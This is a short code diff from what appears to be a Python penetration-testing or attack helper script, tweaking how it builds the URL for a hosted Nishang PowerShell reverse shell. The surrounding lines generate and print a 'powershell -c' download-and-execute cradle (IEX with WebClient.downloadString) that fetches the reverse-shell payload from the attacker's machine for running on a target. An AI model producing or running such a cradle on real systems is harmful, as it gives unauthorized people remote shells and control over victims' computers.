@@ -178,6 +178,7 @@ def nishang_shell_menu():
         ip = get_interface_ip()
         filename = copy_nishang(ip, rev_shell_port, directory)
         url = f"http://{ip}:{port}/{filename}"
+        if int(port) == 80: url = f'http://{ip}/{filename}'
         print(f"Nishang URL: {url}")
         pscommand = f"IEX(New-Object Net.WebClient).downloadString('{url}')"
         print(f"Commnad: powershell -c \"{pscommand}\"")
